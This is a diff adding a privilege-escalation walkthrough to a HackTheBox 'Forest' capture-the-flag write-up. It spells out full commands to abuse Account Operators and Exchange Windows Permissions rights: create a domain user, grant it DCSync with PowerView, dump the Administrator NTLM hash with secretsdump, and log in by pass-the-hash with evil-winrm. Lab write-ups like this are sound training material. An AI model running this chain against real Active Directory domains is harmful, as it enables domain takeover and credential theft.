@@ -210,14 +210,58 @@ Search for our AD account `svc-alfresco@htb.local` in Bloodhound in the search b
 
 ![BloodHound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Forest/Images/Bloodhound.png)
 
-From the above figure, we can see that svc-alfresco is a member of the group `Service Accounts` which is a member of the group `Privileged IT Accounts`, which is a member of `Account Operators`. 
+From the above figure, we can see that svc-alfresco is a member of the group `Service Accounts` which is a member of the group `Privileged IT Accounts`, which is a member of `Account Operators` group which has **GenericAll** permission. With GenericAll permission, we have full rights to the targeted object (add users to a group, reset user’s password, etc.) and we can abuse this weak permission.
+
+The image does not show that “Account Operators” group which has GenericAll permission on the “Exchange Windows Permissions” group. Moreover, the “Exchange Windows Permissions” does have WriteDACL permission on the Domain (htb.local). It means that if we create a user and add it to the “Exchange Windows Permissions” group, we could give him DCSync access rights and dump domain controller password hashes.
 
 
+1. Create a user
+
+```bash
+net user player Qwerty1! /add /domain
+```
+
+2. Add it to the “Exchange Windows Permission”s group
+
+```bash
+net group "Exchange Windows Permissions" player /add
+```
+
+3. Add it to the “Remote Management Users” group (to have remote access rights)
 
 
+```bash
+net localgroup "Remote Management Users" player /add
+```
 
+4. Abuse weak permission on DACLs to get DCSync rights. To abuse the DACL, we used a well-known PowerShell that aims to gain network situational awareness on Windows domains, PowerView.
 
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPass = ConvertTo-SecureString 'Qwerty1!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\player', $SecPass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity player -Credential $Cred -Rights DCSync
+```
 
+Now that player have DCSync permission, we should be able to dump users hashes from the domain controller. Here, we used impacket-secretsdump, another tool from the Impacket suite to dump the Administrator password.
+
+Note the `-just-dc-user` switch that extract only NTDS.DIT data for the user specified and the just-dc-ntlm that extract only NTDS.DIT data (NTLM hashes only).
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/player@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+[*] Cleaning up...
+```
+
+Used `evil-winrm` to sign in with the hash (i.e. PtH) and get the root flag.
+
+```bash
+evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+```
 
 
 
